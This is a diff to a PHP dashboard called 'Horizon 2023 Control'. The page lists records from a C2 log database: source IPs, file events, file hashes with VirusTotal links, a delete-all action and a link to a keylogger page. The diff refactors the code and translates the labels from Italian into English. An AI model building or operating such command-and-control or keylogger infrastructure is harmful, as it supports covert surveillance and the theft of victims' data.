@@ -1,8 +1,15 @@
 
+<?php
+
+include 'conf.php';
+include 'db.php';
+
+?>
+
 <html>
 
 <head>
-<title>.:: Horizon 2023 Control v.0.1 ::.</title>
+<title>.:: <?php echo $title; ?> ::.</title>
 <link rel="stylesheet" href="main.css">
 </head>
 
@@ -21,7 +28,7 @@
 	<td>&nbsp;</td>
 </tr>
 <tr>
-	<td colspan="7">&nbsp;</td>
+	<td colspan="7">&nbsp;</td> 
 </tr>
 
 <?php
@@ -40,32 +47,10 @@ function parsingHash($m) {
 }
 
 
-//utente per db c2 da settare
-$servername = "localhost";
-$username = "root";
-$password = "";
-
-$conn = new mysqli($servername, $username, $password);
-if ($conn->connect_error) {
-  die("Connection failed: " . $conn->connect_error);
-}
-
-//se request valorizzato
-//1 viene memorizzato
-//2 generata pagina con lettura payload
-//3 parsing nome file, hash, payload e link per lettura raw di tutto il log e download del base64 convertito
-
-
 if( isset($_REQUEST["do"]) && $_REQUEST["do"]=="D" ) {
 	$sql = "DELETE FROM c2.log_monitor";
 	$result = $conn->query($sql);
 }
-
-
-
-
-
-//elenco ricorsivo dei record
 
 $sql = "SELECT * FROM c2.log_monitor order by timestamp DESC";
 $result = $conn->query($sql);
@@ -73,10 +58,10 @@ $result = $conn->query($sql);
 
 if ($result->num_rows > 0) {
   while($row = $result->fetch_assoc()) {	
-	$filename =  parsingFileName($row["event_full"]);
-	$hash = parsingHash($row["event_full"]);
+	$file_name =  $row["file_name"];
+	$hash = $row["hash"];
 	
-	echo "<tr><td>" . $row["ip_address_source"] . "</td><td>" . $row["timestamp"] . "</td><td>" . $row["id_log"] . "</td><td>" . $filename . "</td><td><a target='_blank' href='https://www.virustotal.com/gui/search/" . $hash . "'>" . $hash . "</a></td><td align='center'><a target='_blank' href='apri.php?id=" . $row["id"] . "'>Apri</a></td></tr>";
+	echo "<tr><td>" . $row["ip_address_source"] . "</td><td>" . $row["timestamp"] . "</td><td>" . $row["id_log"] . "</td><td>" . $file_name . "</td><td><a target='_blank' href='https://www.virustotal.com/gui/search/" . $hash . "'>" . $hash . "</a></td><td align='center'><a target='_blank' href='open.php?id=" . $row["id"] . "'>Apri</a></td></tr>";
   }
 } 
 
@@ -86,10 +71,10 @@ if ($result->num_rows > 0) {
 ?>
 
 <tr>
-	<td colspan="7">ID Log 169 -> Creazione | 269 -> Rinomina | 369 -> Modifica</td>
+	<td colspan="7">ID Log 169 -> Create | 269 -> Rename | 369 -> Modify</td>
 </tr>
 <tr>
-	<td colspan="7">Record totali: <?php echo $result->num_rows; ?>&nbsp;|&nbsp;<a href="index.php">Aggiorna</a>&nbsp;|&nbsp;<a href="index.php?do=D">Svuota</a>&nbsp;|&nbsp;<a href="key.php">Keylogger</a></td>
+	<td colspan="7">Record number: <?php echo $result->num_rows; ?>&nbsp;|&nbsp;<a href="index.php">Update</a>&nbsp;|&nbsp;<a href="index.php?do=D">Delete All</a>&nbsp;|&nbsp;<a href="key.php">Keylogger</a></td>
 </tr>
 
 
